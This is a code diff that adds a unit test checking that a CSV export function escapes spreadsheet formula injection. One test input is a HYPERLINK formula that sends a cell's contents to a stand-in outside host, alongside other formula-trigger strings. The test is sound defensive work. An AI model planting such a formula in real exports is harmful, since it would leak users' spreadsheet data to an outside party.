@@ -50,6 +50,28 @@ describe("answersCsv", () => {
     );
   });
 
+  it("puts a quote mark before text a spreadsheet would read as a formula, but not before a negative number", () => {
+    const formula: Answer = {
+      ...first,
+      priorDue: '=HYPERLINK("https://other.example/?"&C2,"Open")',
+      utcOffsetMinutes: -60,
+    };
+    expect(answersCsv([formula]).split("\r\n")[1]).toBe(
+      '2026-10-01T10:00:00.000Z,2026-10-01,https://pod.example/i/catalog.ttl#deck-1,https://pod.example/i/decks/deck-1.ttl#se,front-to-back,4,recall,,1,,,,"\'=HYPERLINK(""https://other.example/?""&C2,""Open"")",-60',
+    );
+    for (const [text, written] of [
+      ["+1", "'+1"],
+      ["-1", "'-1"],
+      ["@SUM(A1)", "'@SUM(A1)"],
+      ["\tx", "'\tx"],
+      ["\rx", '"\'\rx"'],
+      ["x=1", "x=1"],
+    ]) {
+      const row = answersCsv([{ ...first, chosenDistractor: text! }]).split("\r\n")[1]!;
+      expect(row.split(",")[9]).toBe(written);
+    }
+  });
+
   it("quotes a field with a comma or a quote in it, and writes the header alone for no answer", () => {
     const odd = { ...first, cardUrl: 'https://pod.example/i/a,"b".ttl#se' };
     expect(answersCsv([odd]).split("\r\n")[1]).toContain(
